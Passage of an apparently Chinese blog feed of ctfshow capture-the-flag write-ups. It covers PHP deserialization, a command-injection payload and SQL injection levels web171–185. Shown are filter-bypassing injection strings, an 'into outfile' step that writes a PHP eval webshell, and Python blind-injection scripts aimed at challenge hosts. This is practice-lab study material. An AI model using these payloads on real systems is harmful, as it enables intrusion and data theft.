class="comment">//复制文件,生成的新文件名进行md5加密+随机数</span></span><br><span class="line">      <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">      <span class="comment">//删除原来的文件</span></span><br><span class="line">      <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道这些以后，就可以成功进行rce了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>只需要两个参数中含有对应的值就行了。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=<span class="title">php</span></span>;tac f*</span><br></pre></td></tr></table></figure><h2 id="web276-phar反序列化"><a href="#web276-phar反序列化" class="headerlink" title="web276(phar反序列化)"></a>web276(phar反序列化)</h2><p>源码</p><p><img src="../images/image-20230113165336370.png" alt="image-20230113165336370"></p><h2 id="web277-python反序列化"><a href="#web277-python反序列化" class="headerlink" title="web277(python反序列化)"></a>web277(python反序列化)</h2><h2 id="web278-python反序列化"><a href="#web278-python反序列化" class="headerlink" title="web278(python反序列化)"></a>web278(python反序列化)</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-sql注入 刷题记录</title>
      <link href="/posts/b77a4eaf.html"/>
      <url>/posts/b77a4eaf.html</url>
      
        <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>源码</p><p><img src="../images/image-20221226192746294.png" alt="image-20221226192746294"></p><p>给了一个sql语句，那么我们就可以通过这sql语句来进行判断，那么我们可以自己新建一个数据库来测试。</p><p>就是利用phpstudy和navicat    （网上有教程，可以去拿来学习学习）</p><p><img src="../images/image-20221226193154082.png" alt="image-20221226193154082"></p><p>新建了一个和题目差不多的user表，然后就可进行测试。</p><p><img src="../images/image-20221226193548945.png" alt="image-20221226193548945"></p><p>通过这几个简单的测试，发现了就是虽然username不等于flag的情况下，可以利用id，就令前面的id=xx不成立的情况下，就可以用到后面的id了，那么我们就得以后面的id为突破口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;xxx     &#x27;&#x27;是为了闭合sql语句，否则无法执行</span><br></pre></td></tr></table></figure><p><strong>解法</strong></p><p>这道题的解法是看到只能查到id=24,我们就怀疑会不会藏在后面，我们就可以一个一个的试出来。</p><p><img src="../images/image-20221226193930975.png" alt="image-20221226193930975"></p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>源码</p><p><img src="../images/image-20221226203357870.png" alt="image-20221226203357870"></p><p><img src="../images/image-20221226203412925.png" alt="image-20221226203412925"></p><p>这道题直接用上一道题的解法，这道题就解不了了那么可以换别的解法，就是union联合注入。</p><p>就是可以本地试一下，如果成功了话，就可以拿去题目试一下</p><p><img src="../images/image-20221226204544643.png" alt="image-20221226204544643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from user where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>这里查询列的数量要和题目给的语句中列的数量一样</p><p>这句话成功执行了，那么我们就可以拿去题目试一下，发现也可以成功执行，就拿到flag了。</p><p><img src="../images/image-20221226204645887.png" alt="image-20221226204645887"></p><p><strong>也可以利用模糊查询，但是只能本地通过，题目不能通过。</strong></p><p><img src="../images/image-20221226205245342.png" alt="image-20221226205245342"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or username like &#x27;%f%</span><br></pre></td></tr></table></figure><p><strong>补充点知识</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql  中的点是 &#x27; . &#x27;  可以这样用，再有多个数据库的情况下， </span><br><span class="line">数据库名.xxxxx    例如这道题就可以这样用  ctfshow_user2.username   ctfshow_user2.id</span><br><span class="line">ctfshow_user2.password</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">也可以把数据库设做别的名字。   利用的是   as  这个单词</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select b.id,b.password from user as b where b.username=&#x27;flag</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,password from ctfshow_user2 where username=&#x27;flag</span><br></pre></td></tr></table></figure><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>源码</p><p><img src="../images/image-20221226210521949.png" alt="image-20221226210521949"></p><p>这道题是结果返回的过程中不能出现flag,那么我们就得想办法把flag给绕过，那么我们就可以通过转换进制来绕过。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select id,bin(username),password from ctfshow_user3 where username=&#x27;flag</span><br></pre></td></tr></table></figure><p>也可以换成hex   —&gt;16进制。</p><p><img src="../images/image-20221226211348202.png" alt="image-20221226211348202"></p><p>那么就可以成功拿到flag了。</p><p>最好是本地测试通过后在搬到题目上</p><p><img src="../images/image-20221226211450157.png" alt="image-20221226211450157"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>源码</p><p><img src="../images/image-20221226225822637.png" alt="image-20221226225822637"></p><p>利用前面的语句已经解不出来了，因为就是把flag和数字都屏蔽掉了，因为flag中还含有数字，所以就得使用替换。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9999&#x27;union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#x27;1&#x27;,&#x27;nba&#x27;),&#x27;2&#x27;,&#x27;nbb&#x27;),&#x27;3&#x27;,&#x27;nbc&#x27;),&#x27;4&#x27;,&#x27;nbd&#x27;),&#x27;5&#x27;,&#x27;nbe&#x27;),&#x27;6&#x27;,&#x27;nbf&#x27;),&#x27;7&#x27;,&#x27;nbg&#x27;),&#x27;8&#x27;,&#x27;nbh&#x27;),&#x27;9&#x27;,&#x27;nbi&#x27;),&#x27;0&#x27;,&#x27;nbj&#x27;),&#x27;a&#x27; from ctfshow_user4 where username=&#x27;flag&#x27;--+</span><br></pre></td></tr></table></figure><p>—+指的是注释</p><p>这个py的意思就是把flag中的数字全部替换成别的，用16进制转换的原因是，因为转换的字母全是大写，所以我们替换的是小写，那么就不会出现影响。</p><p><strong>替换回去的py脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nb=<span class="string">&#x27;ctfshow&#123;nbfnbcnbgnbdnbfnbfnbgnbcnbfnbhnbfFnbgnbgnbgBnbcnbenbcnbanbcnbbnbfnbcnbfnbfnbfnbcnbcnbenbfnbfnbbDnbfnbanbfnbcnbcnbanbcnbhnbbDnbcnbdnbcnbbnbfnbanbcnbanbbDnbfnbbnbcnbgnbcnbcnbcnbcnbbDnbfnbdnbfnbbnbfnbcnbfnbbnbcnbdnbcnbfnbcnbjnbcnbanbcnbdnbcnbbnbfnbfnbcnbjnbgD&#125;&#x27;</span></span><br><span class="line"><span class="comment">#nb表示number</span></span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nba&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbb&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbc&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbd&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbe&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbf&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbg&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbh&#x27;</span>,<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbi&#x27;</span>,<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbj&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(nb)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221226232256106.png" alt="image-20221226232256106"></p><p>这里去输入a是为了把flag名给替换掉。</p><p>输入payload，拿到转换后的flag，放到脚本里</p><p><img src="../images/image-20221226232824965.png" alt="image-20221226232824965"></p><p>得到输出结果后，进行16进制转换。</p><p><img src="../images/image-20221226233028450.png" alt="image-20221226233028450"></p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>源码</p><p><img src="../images/image-20221226234423628.png" alt="image-20221226234423628"></p><p>这里去查了一下ascii表，发现是全部都给过滤掉了，太致命了。所以看了群主的视频，学到了一种方法</p><p>就是利用这个东西</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile&#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>然后就去连接蚁剑，连接蚁剑完后就去连接数据库就好了。</p><p>（但是我连接数据库失败，不知道是啥原因）</p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>源码</p><p><img src="../images/image-20221227153245178.png" alt="image-20221227153245178"></p><p>就是增加了过滤，但是这里也没给过滤了啥，所以可以拿简单的代码试试，看能不能打通。</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;26     -1&#x27; or username=&#x27;flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227153414750.png" alt="image-20221227153414750"></p><p>成功拿到flag。</p><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>源码</p><p><img src="../images/image-20221227154121948.png" alt="image-20221227154121948"></p><p>这道题简单进行了测试，发现的是对空格进行了过滤。</p><p><strong>空格被过滤的替换方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先我们空格被过滤，这个绕过方法有很多</span><br><span class="line">使用注释绕过，/**/，但是因为’/‘被过滤，导致此方法无法使用</span><br><span class="line">使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用（）包围，并且两端可以没有多余的空格</span><br><span class="line">使用符号替代空格 %20 %09 %0d %0b %0c %0d %a0 %0a，这里我选择了%0a进行绕过</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227154738181.png" alt="image-20221227154738181"></p><p>通过测试，确实是空格被过滤了，那么我们就可以选择2为注释点。</p><p><img src="../images/image-20221227154904901.png" alt="image-20221227154904901"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/password/**/from/**/ctfshow_user/**/where/**/username=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><p>直接用#不行，得进行url编码。</p><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>源码</p><p><img src="../images/image-20221227155020058.png" alt="image-20221227155020058"></p><p>这道题是把/**给过滤掉了，然后换成%0b就行。</p><p><img src="../images/image-20221227155457926.png" alt="image-20221227155457926"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0bunion%0bselect%0b&#x27;1&#x27;,(select%0bpassword%0bfrom%0bctfshow_user%0bwhere%0busername=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>源码</p><p><img src="../images/image-20221227155714933.png" alt="image-20221227155714933"></p><p>这道题进行了测试下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/  %0a  %0b 都过滤掉了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227155823003.png" alt="image-20221227155823003"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>源码</p><p><img src="../images/image-20221227160433511.png" alt="image-20221227160433511"></p><p>用179的payload还能用，但是得把后面的东西去掉，也该是过滤掉了;或者是%23</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>源码</p><p><img src="../images/image-20221227160739728.png" alt="image-20221227160739728"></p><p>给了过滤项。</p><p>and的优先级高于or，需要同时满足两边的条件才会返回true，那么后面可以接一个or，or的两边有一个为true，既可以满足and。即：1 and 0 or 1</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||username=&#x27;flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227161951410.png" alt="image-20221227161951410"></p><p>这道题也能用%0c来做，那么就是题目给漏了。</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>源码</p><p><img src="../images/image-20221227162638001.png" alt="image-20221227162638001"></p><p>多过滤了个flag</p><p>%  —-&gt;相当于*，任意匹配</p><p>_   ——-&gt;相当于？，只能匹配一个字符</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||(username)like&#x27;%fla%</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227162805178.png" alt="image-20221227162805178"></p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>源码</p><p><img src="../images/image-20221227174007597.png" alt="image-20221227174007597"></p><p><a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a>   摘自这篇博客</p><p>解答：waf又增加了一些，题目也有变化了。查询到的结果会返回到下面第三个灰块那里。</p><p>select不能用，就只能选择布尔盲注或者时间盲注了。</p><p>这题的解法是在已知表名的情况下实现的，再结合模糊匹配like或者正则匹配regexp。<br>写脚本前先测试一下语句是否能正常执行，可以的话，再写到脚本里。</p><p>因为每次查询记录总数都是1条，就是我们要找的flag，所以页面固定会出现$user_count = 1;，可以用布尔盲注。</p><p>题目这里可以行得通</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=`ctfshow_user`where`pass`like&#x27;ctfshow&#123;%&#x27;</span><br></pre></td></tr></table></figure><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">            <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#有并发数量限制的题目，就睡一段时间</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>regexp</code>这个是正则匹配的意思。</p><p><img src="../images/image-20221227182656859.png" alt="image-20221227182656859"></p><p>利用脚本就可以跑完了，就是跑的会有点久。</p><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>源码</p><p><img src="../images/image-20221227183934675.png" alt="image-20221227183934675"></p><p>着里是把where和单双引号都给过滤掉了，那么我们就得去利用16进制给绕过，where被过滤的话可以使用having进行绕过，但是having有使用条件.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个HAVING子句必须位于GROUP BY子句之后，并位于ORDER BY子句之前。</span><br></pre></td></tr></table></figure><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://77ccea0a-ea21-463d-bd36-c3517890ddcd.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    a= <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        a += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line">    <span class="keyword">return</span> a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">48</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(0x63746673686f77&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(str2hex(flag+x))</span><br><span class="line">                <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">            &#125;</span><br><span class="line">            response=requests.post(url,data=data)</span><br><span class="line">            <span class="comment">#有并发数量限制的题目，就睡一段时间</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">                flag+=x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">      main()</span><br></pre></td></tr></table></figure><h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><p>源码</p><p><img src="../images/image-20221229192109344.png" alt="image-20221229192109344"></p><p>这题是把<strong>数字  where 单双引号</strong> 给过滤掉了，那么我们就得想办法构造字符了。</p><p><img src="../images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center.png" alt="在这里插入图片描述"></p><p>就是利用这个东西来构造字符串，但是我们得需要一个函数来把这些构造出来的东西给连接起来。</p><p><img src="../images/1a58fc8b87484af9952dbcf4f65e90e1.png" alt="img"></p><p>本地测试了一下，发现确实可以。</p><p><img src="../images/image-20221229214124144.png" alt="image-20221229214124144"></p><p>以下脚本摘自这篇文章   <a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a></p><p>wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    temp=<span class="string">&quot;concat(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        tip=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.digits:</span><br><span class="line">            tmp=<span class="built_in">int</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip=<span class="number">1</span></span><br><span class="line">            temp+=<span class="string">&quot;char(&quot;</span></span><br><span class="line">            tmp=<span class="built_in">ord</span>(x)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">            temp+=<span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_d=<span class="string">&quot;(&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tmp):</span><br><span class="line">                temp_d+=<span class="string">&quot;true+&quot;</span></span><br><span class="line">            temp_d=temp_d[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tip==<span class="number">1</span>:</span><br><span class="line">                temp_d+=<span class="string">&quot;)&quot;</span></span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=<span class="string">&quot;,&quot;</span></span><br><span class="line">    temp=temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(formatString(&quot;0x63746673686f777b&quot;))</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d2f644f5-968d-4301-b037-267c7b183b0e.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"><span class="comment">#dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span></span><br><span class="line">dic=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span 